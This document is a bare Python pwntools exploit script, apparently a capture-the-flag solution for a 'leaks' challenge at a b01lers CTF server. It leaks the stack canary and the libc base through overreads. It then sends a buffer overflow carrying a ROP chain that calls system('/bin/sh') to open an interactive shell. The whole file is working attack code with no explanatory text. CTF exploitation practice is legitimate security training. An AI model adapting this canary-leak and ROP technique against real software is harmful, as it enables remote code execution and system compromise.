#!/usr/bin/python3
from pwn import *
from past.builtins import xrange
from time import sleep
import random

#libc
libc = ELF('./leaks-libc')

#Gadget
L_pop_rdi = 0x0015d1cb
L_ret = 0x00187d5f

#Addr
system = 0x55410
binsh = 0x1b75aa

#Exploit
if __name__ == '__main__':
#	io = process('./leaks-c85e4a348b2a07ba8e6484d69956d968',env={'LD_PRELOAD':libc.path})
	io = remote('chal.ctf.b01lers.com',1009)
	io.sendlineafter('\n',f'{0x1}')
	io.sendline('A')
	
	io.sendline(f'{0x18}')	
	io.send('A'*0x18+'B')
	io.recvuntil('B')
	canary = u64(io.recvline().strip().rjust(8,b'\x00'))
	print(hex(canary))

	io.sendline(f'{0x27}')
	io.send('A'*0x27 + 'B')
	io.recvuntil('AB')
	libc_base = u64(io.recvn(6).strip().ljust(8,b'\x00')) - 0x270b3
	print(hex(libc_base))

	io.sendline(f'{0x60}')
	io.send((b'A'*0x18+\
		p64(canary)+\
		p64(libc_base+0x1eeb28)+\
		p64(libc_base+L_pop_rdi)+\
		p64(libc_base+binsh)+\
		p64(libc_base+L_ret)+\
		p64(libc_base+system)).ljust(0x61,b'\x00'))
	io.interactive()
